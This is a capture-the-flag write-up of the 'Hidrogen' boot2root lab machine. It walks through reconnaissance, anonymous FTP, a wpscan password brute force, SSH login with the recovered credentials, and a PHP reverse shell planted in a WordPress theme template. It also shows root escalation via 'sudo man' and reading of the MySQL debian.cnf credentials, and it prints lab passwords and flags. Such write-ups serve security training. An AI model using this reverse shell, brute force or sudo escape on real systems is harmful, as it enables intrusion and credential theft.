# - Hidrogen

So today we will be doing a challenge on Hidrogen Boot2Root machine. For this machine, it is about a wordpress CMS exploitation and privesc of root using `/usr/bin/man`. Let's dig in.

![](/images/writeup/internship/hidrogen/challenge.PNG)
## Reconnaissance

`IP = 192.168.8.118`

Access the website and we get this. It said to state the domain name. So we write it in `/etc/hosts` and give a random name 

![](/images/writeup/internship/hidrogen/web.PNG)

`192.168.8.118   hidrogen.netbytesec.com`

![](/images/writeup/internship/hidrogen/hidrogen.PNG)

We got nothing in here, so we will do `nmap` scan in hopes we get something interesting to look on.

We can see here there is `/robots.txt` on the port 80 and the directory to `/phpmyadmin` login page that maybe some database service is running on the web server. 

```bash
┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
└─# nmap -sCV -A 192.168.8.118 -o nmap/scan.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 01:29 EDT
Nmap scan report for hydrogen.co (192.168.8.118)
Host is up (0.00092s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 24:04:bf:3c:02:c8:ac:cd:5e:41:e8:5e:c8:47:96:76 (DSA)
|   2048 28:fd:24:7b:a5:9a:b6:62:ad:d6:3f:b0:4e:7e:ea:e9 (RSA)
|_  256 eb:b8:37:33:af:eb:a2:a7:4a:84:27:6e:35:65:d4:a6 (ECDSA)
80/tcp open  http    nginx 1.2.1
|_http-title: Hydrogen Co
|_http-server-header: nginx/1.2.1
| http-robots.txt: 1 disallowed entry 
|_/phpmyadmin
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.09 ms 192.168.37.2
2   0.11 ms hydrogen.co (192.168.8.118)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 271.18 seconds
```

On the other hand, one more interesting port that is open which is FTP port 21. How about we try to login into it by using default login `anonymous:anonymous`. 
## Enumeration

```bash
┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
└─# ftp hidrogen.netbytesec.com
Connected to hidrogen.netbytesec.com.
220 ProFTPD 1.2.6 Server (Hydrogen Corporation File Transfer Service) [hydrogrencorp]
Name (hidrogen.netbytesec.com:kali): anonymous
331 Anonymous login ok, send your complete email address as your password.
Password: 
230 Anonymous access granted, restrictions apply.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (192,168,8,118,161,169).
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Feb 19  2019 .
drwxr-xr-x   2 ftp      ftp          4096 Feb 19  2019 ..
-rw-r--r--   1 ftp      ftp           472 Jan 19  2019 email.txt
-r--------   1 ftp      ftp            39 Jan 18  2019 flag1.txt
226 Transfer complete.

```

Walla. There is flag1.txt in this FTP service. We can use `get` command to take this file and we get the first flag.

`flag{a173c6cb236d6fe768ad94a6df400874}`

Look into the `email.txt` file and we can see `john@hydrogen.co`

![](/images/writeup/internship/hidrogen/email.PNG)

Change the domain name first to `hydrogen.co`. Something interesting here, there is `/wordpress` directory. 

```bash
┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
└─# dirb http://hydrogen.co            

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct 18 03:16:58 2023
URL_BASE: http://hydrogen.co/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://hydrogen.co/ ----
==> DIRECTORY: http://hydrogen.co/css/                                            
==> DIRECTORY: http://hydrogen.co/img/                                            
+ http://hydrogen.co/index.html (CODE:200|SIZE:5033)                              
+ http://hydrogen.co/info.php (CODE:200|SIZE:49727)                               
==> DIRECTORY: http://hydrogen.co/phpmyadmin/                                     
+ http://hydrogen.co/robots.txt (CODE:200|SIZE:36)                                
==> DIRECTORY: http://hydrogen.co/vendor/                                         
==> DIRECTORY: http://hydrogen.co/wordpress/ 
```

We find something in this directory, there is `http://hydrogen.co/wordpress/wp-login.php`

![](/images/writeup/internship/hidrogen/wordpresslogin.PNG)

First and foremost if there is wordpress, we will use tools like `wpscan` to enumerate the login page by following this absolute powerful website [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce)


```bash
┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
└─# wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://hydrogen.co/wordpress/ --wp-content-dir wp-login.php --scope url --detection-mode aggressive --enumerate p --api-token xxxxxNeeMLfPeguxxxxxnlHYD4o70xxxxxx --passwords /opt/tools/SecLists/Passwords/probable-v2-top1575.txt
```

The output:

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://hydrogen.co/wordpress/ [192.168.8.118]
[+] Started: Wed Oct 18 03:33:11 2023

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://hydrogen.co/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://hydrogen.co/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://hydrogen.co/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.17 identified (Outdated, released on 2023-10-12).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://hydrogen.co/wordpress/?feed=atom, <generator uri="https://wordpress.org/" version="5.1.17">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://hydrogen.co/wordpress/wp-admin/load-styles.php, Match: '5.1.17'

[i] The main theme could not be detected.

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=====> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / justin                                                          
Trying john / justin Time: 00:00:19 <          > (130 / 1705)  7.62%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: justin

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 24

[+] Finished: Wed Oct 18 03:33:37 2023
[+] Requests Done: 185
[+] Cached Requests: 6
[+] Data Sent: 86.211 KB
[+] Data Received: 168.161 KB
[+] Memory used: 209.742 MB
[+] Elapsed time: 00:00:25
```

We got `john:justin` as a login into the wordpress database. 

![](/images/writeup/internship/hidrogen/wordpressdashboard.PNG)
## Exploitation

There are 2 ways that we can use to obtain the others flag. We use the same credentials to access the `ssh` service and we get in.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/internship/hidrogen]
└─# ssh john@hydrogen.co
john@hydrogen.co's password: 
Linux hydrogrencorp 3.2.0-6-amd64 #1 SMP Debian 3.2.102-1 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 18 07:53:00 2023 from 192.168.22.13

#######################################
### Welcome to Hydrogen Corporation ###
#######################################

john@hydrogrencorp:~$ ls -la
total 48
drwxr-xr-x 3 john john  4096 Oct 17 10:07 .
drwxr-xr-x 3 root root  4096 Jan 17  2019 ..
-rw------- 1 john john   505 Oct 18 08:17 .bash_history
-rw-r--r-- 1 john john   220 Jan 17  2019 .bash_logout
-rw-r--r-- 1 john john  3562 Jan 19  2019 .bashrc
-r-------- 1 john john    39 Jan 18  2019 flag3.txt
drwx------ 2 john john  4096 Oct 17 03:28 .gnupg
-rw------- 1 john john   532 Feb 20  2019 .lesshst
-rw-r--r-- 1 john john     0 Oct 17 05:27 nc
-rw-r--r-- 1 john john   675 Jan 17  2019 .profile
-rw------- 1 john john 12288 Oct 17 10:08 .swp
john@hydrogrencorp:~$ 

```

Then we can collect the `flag3.txt` right away

`flag{b4270e25c9fadba2b79e18055141d882}`
### First Way
#### Foothold - RCE

Back to the WordPress, the best practice is we need to try any function of the website server, and try to understand it. Maybe it is vulnerable to file upload or change of file content or anything that can get us the remote code execution. Here is some writeup that may similar to this [https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145](https://medium.com/secjuice/apocalyst-ctf-writeup-ccf9e2afb145)

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.8.118';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
.
.
.
.
```

Change the file content in `/twentythirteen/404.php` template. Then update the file and listen. Go to the file directory and we are in into the web shell!!

```bash
john@hydrogrencorp:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.8.118] from (UNKNOWN) [192.168.8.118] 38529
Linux hydrogrencorp 3.2.0-6-amd64 #1 SMP Debian 3.2.102-1 x86_64 GNU/Linux
 05:04:49 up 2 days, 19:19,  2 users,  load average: 0.06, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
john     pts/0    192.168.22.22    04:06   31:52   0.10s  0.00s sshd: john [pri
john     pts/2    192.168.22.73    04:50    8.00s  0.00s  0.00s nc -lnvp 4444
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: no job control in this shell
sh-4.2$ 
```

![](/images/writeup/internship/hidrogen/in.gif)

We can find the `flag2.txt` 

```bash
www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ find / -name "flag2.txt" 2>/dev/null
/usr/share/nginx/www/wordpress.bak/flag2.txt
/usr/share/nginx/www/wordpress/flag2.txt
www-data@hydrogrencorp:/usr/share/nginx/www/wordpress/wp-content$ cat /usr/share/nginx/www/wordpress/flag2.txt
flag{db6029f93797df27262460156bfbe0b9}
```

#### Privesc

On the privesc part, basically it is much easier if we just do this on the first place. To gain a root user access, just `sudo -l` and we are lucky if it is enable for us to read. If not, we can try to run linpeas.sh or other tools to gain something interesting in the machine. The best practice, upload the tools in directory `/tmp or /dev/shm`

After look on the linpeas output, there is something interesting that we can get. There is mysql credentials file

```bash
-rw------- 1 root root 333 Jan 17  2019 /etc/mysql/debian.cnf
user     = debian-sys-maint
password = GXSBRvrHFALvpIca
user     = debian-sys-maint
password = GXSBRvrHFALvpIca
```

Try login into it by give this command

`mysql --defaults-file=/etc/mysql/debian.cnf`

But we unsuccessful to login, so we need to get the root access first. So here we are lucky because `sudo -l` can be read. 

```bash
john@hydrogrencorp:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User john may run the following commands on this host:
    (root) /usr/bin/man
```

Just ask our long-live friend, Google and making some research on how to run this, I found some interesting article [here](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/) or we can read on gtfobins site too [https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/)

Give `sudo man man` and a man pager of man will be pop-up. So right now, we want to escape this. We just give command `!bash` and we get in into the root!!

![](/images/writeup/internship/hidrogen/getin2.gif)

```bash
john@hydrogrencorp:~$ sudo man man
root@hydrogrencorp:/usr/share/man# find / -name "flag4.txt" 2>/dev/null
/root/flag4.txt
root@hydrogrencorp:/usr/share/man# cat /root/flag4.txt
flag{6d24904be52c92fad1c79fe0e22fff20}
```

So the last one is `flag5.txt`. If we use `find / -name "flag5.txt" 2>/dev/null`, there is no file of this. So we will assume it is in mysql database. We use the mysql credentials earlier.

```bash
root@hydrogrencorp:/tmp# mysql --defaults-file=/etc/mysql/debian.cnf
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7972
Server version: 5.5.60-0+deb7u1-log (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

`SHOW DATABASES;` --> `USE wordpress;` --> `SHOW TABLES;` --> `SELECT * FROM wp_users;`

```bash
mysql> SELECT * FROM wp_users;
+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url                                    | user_registered     | user_activation_key | user_status | display_name | secret                                 |
+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+
|  1 | john       | $P$BbzHGQy0mhTKVJKP0rYhhbTwVvhQ9v1 | john          | john@hydrogen.co | https://www.youtube.com/watch?v=dQw4w9WgXcQ | 2023-10-18 18:28:37 |                     |           0 | john         | flag{a260af638f07d39c838810eda005ceb3} |
+----+------------+------------------------------------+---------------+------------------+---------------------------------------------+---------------------+---------------------+-------------+--------------+----------------------------------------+
1 row in set (0.00 sec)

mysql> 

```

We got the last flag `flag{a260af638f07d39c838810eda005ceb3}`

### Second Way

#### Privesc

For the second way is just straightforward, follow on the first way after use `sudo -l`

```bash
john@hydrogrencorp:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User john may run the following commands on this host:
    (root) /usr/bin/man
```

We can get all `flag2, flag4 and flag5`

```bash
root@hydrogrencorp:/usr/share/man# find / -name "flag2.txt" 2>/dev/null
/usr/share/nginx/www/wordpress.bak/flag2.txt
/usr/share/nginx/www/wordpress/flag2.txt
root@hydrogrencorp:/usr/share/man# find / -name "flag4.txt" 2>/dev/null
/root/flag4.txt
root@hydrogrencorp:/usr/share/man# mysql --defaults-file=/etc/mysql/debian.cnf
```

We got all flag huhu.

## Bonus

For the flag 5, we also can use phpmyadmin website account or mysql command to find it by using credentials `john:justin`

![](/images/writeup/internship/hidrogen/theend.gif)




